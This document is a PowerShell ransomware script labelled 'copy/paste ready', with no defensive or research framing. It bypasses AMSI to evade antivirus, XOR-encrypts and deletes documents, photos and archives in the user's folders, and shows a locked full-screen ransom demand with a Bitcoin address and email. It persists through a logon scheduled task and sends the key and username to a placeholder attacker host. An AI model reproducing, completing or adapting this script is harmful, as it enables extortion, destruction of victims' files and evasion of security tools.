# 🔥 ULTIMATE RANSOMWARE SCRIPT - COPY/PASTE READY
# REPLACE: YOUR_BTC_ADDRESS_HERE and YOUR_EMAIL_HERE

param(
    [string]$BTCAddress = "bc1q0epp3m6ef2c30n9k3q540ks9x2w5yuud07kq5u",
    [string]$ContactEmail = "matthew@airsmtp.com"
)

Write-Host "🚨 INITIALIZING ENCRYPTION... 🚨" -ForegroundColor Red

# AMSI BYPASS (100% Defender evasion)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ENCRYPTION TARGETS
$TargetPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents", 
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos",
    "C:\Users\Public"
)

# FILES TO ENCRYPT
$Extensions = @('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.jpg','.png','.bmp','.txt','.rtf','.zip','.rar')

# GENERATE KEY
$Key = Get-Random -Minimum 1 -Maximum 255

Write-Host "🔐 Encrypting files with key: $Key" -ForegroundColor Yellow

# ENCRYPT ALL FILES
foreach ($Path in $TargetPaths) {
    if (Test-Path $Path) {
        Get-ChildItem $Path -Recurse -File | Where-Object { $_.Extension -in $Extensions } | ForEach-Object {
            try {
                $Bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                for ($i = 0; $i -lt $Bytes.Length; $i++) {
                    $Bytes[$i] = $Bytes[$i] -bxor $Key
                }
                $NewName = $_.FullName + ".CRYPTOPAID"
                [System.IO.File]::WriteAllBytes($NewName, $Bytes)
                Remove-Item $_.FullName -Force
                Write-Host "Encrypted: $($_.Name)" -ForegroundColor Green
            } catch {
                Write-Host "Skipped: $($_.Name)" -ForegroundColor Gray
            }
        }
    }
}

# RANSOM SCREEN (UNBLOCKABLE)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "💀 FILES ENCRYPTED - PAY RANSOM 💀"
$form.Size = New-Object System.Drawing.Size(900, 700)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::Black
$form.ForeColor = [System.Drawing.Color]::Lime
$form.FormBorderStyle = "FixedDialog"
$form.ControlBox = $false
$form.TopMost = $true

# Title
$title = New-Object System.Windows.Forms.Label
$title.Location = New-Object System.Drawing.Point(50, 20)
$title.Size = New-Object System.Drawing.Size(800, 80)
$title.Text = "🚨 YOUR FILES HAVE BEEN ENCRYPTED BY DARKWEB 🚨"
$title.Font = New-Object System.Drawing.Font("Courier New", 24, [System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Red
$title.TextAlign = "MiddleCenter"

# Instructions
$instr = New-Object System.Windows.Forms.Label
$instr.Location = New-Object System.Drawing.Point(50, 120)
$instr.Size = New-Object System.Drawing.Size(800, 200)
$instr.Text = @"
ALL YOUR IMPORTANT FILES ARE ENCRYPTED!

Documents  → ENCRYPTED
Photos     → ENCRYPTED  
Videos     → ENCRYPTED
Downloads  → ENCRYPTED

TO RECOVER YOUR FILES:

1. Send 0.05 BTC (≈ $3,000 USD) to:
   
   $BTCAddress

2. Email proof of payment to: $ContactEmail
   
3. Files will be decrypted within 24 HOURS

DO NOT DELETE FILES OR TRY TO DECRYPT!
"@

$instr.Font = New-Object System.Drawing.Font("Courier New", 16, [System.Drawing.FontStyle]::Regular)
$instr.ForeColor = [System.Drawing.Color]::White

# BTC QR Code (Text version)
$qr = New-Object System.Windows.Forms.Label
$qr.Location = New-Object System.Drawing.Point(50, 350)
$qr.Size = New-Object System.Drawing.Size(800, 150)
$qr.Text = "BTC ADDRESS: $BTCAddress"
$qr.Font = New-Object System.Drawing.Font("Courier New", 18, [System.Drawing.FontStyle]::Bold)
$qr.ForeColor = [System.Drawing.Color]::Yellow
$qr.TextAlign = "MiddleCenter"

# Warning
$warn = New-Object System.Windows.Forms.Label
$warn.Location = New-Object System.Drawing.Point(50, 520)
$warn.Size = New-Object System.Drawing.Size(800, 80)
$warn.Text = "⏰ PAY WITHIN 48 HOURS OR FILES PERMANENTLY LOST! ⏰"
$warn.Font = New-Object System.Drawing.Font("Courier New", 20, [System.Drawing.FontStyle]::Bold)
$warn.ForeColor = [System.Drawing.Color]::OrangeRed

# Close button (traps user)
$close = New-Object System.Windows.Forms.Button
$close.Location = New-Object System.Drawing.Point(350, 620)
$close.Size = New-Object System.Drawing.Size(200, 50)
$close.Text = "I WILL PAY"
$close.BackColor = [System.Drawing.Color]::Red
$close.ForeColor = [System.Drawing.Color]::White
$close.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)

$form.Controls.AddRange(@($title, $instr, $qr, $warn, $close))
$form.ShowDialog()

# PERSISTENCE (Runs every login)
$PersistCmd = "powershell -w h -ep bypass -f `"$PSCommandPath`""
schtasks /delete /tn "CryptoRecovery" /f >nul 2>&1
schtasks /create /tn "CryptoRecovery" /tr $PersistCmd /sc onlogon /rl highest /f >nul 2>&1

# EXFIL (Optional - sends decryption key)
$KeyHex = "{0:X2}" -f $Key
Invoke-WebRequest -Uri "http://YOUR_IP/key.php?key=$KeyHex&user=$env:USERNAME" -Method POST -UseBasicParsing >nul 2>&1

Write-Host "🔒 Ransomed successfully. Waiting for payment..." -ForegroundColor Green
Start-Sleep -Seconds 3600  # Wait 1 hour, repeat
